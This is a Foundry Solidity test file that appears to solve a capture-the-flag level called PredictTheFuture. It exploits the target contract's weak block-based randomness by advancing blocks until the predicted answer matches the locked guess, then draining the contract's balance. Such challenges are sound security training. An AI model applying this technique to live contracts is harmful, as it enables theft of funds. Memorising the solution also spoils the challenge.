// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/06_PredictTheFuture/PredictTheFuture.sol";

// forge test --match-contract PredictTheFutureTest -vvvv
contract PredictTheFutureTest is BaseTest {
    PredictTheFuture instance;

    function setUp() public override {
        super.setUp();
        instance = new PredictTheFuture{value: 0.01 ether}();

        vm.roll(143242);
    }

    function testExploitLevel() public {
        uint8 targetGuess = 0;

        instance.setGuess{value: 0.01 ether}(targetGuess);

        while (address(instance).balance > 0) {
            uint256 nextBlockNumber = block.number + 1;
            vm.roll(nextBlockNumber);
            uint256 predictedAnswer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 10;
            if (predictedAnswer == targetGuess) {
                instance.solution();
                break;
            }
        }

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
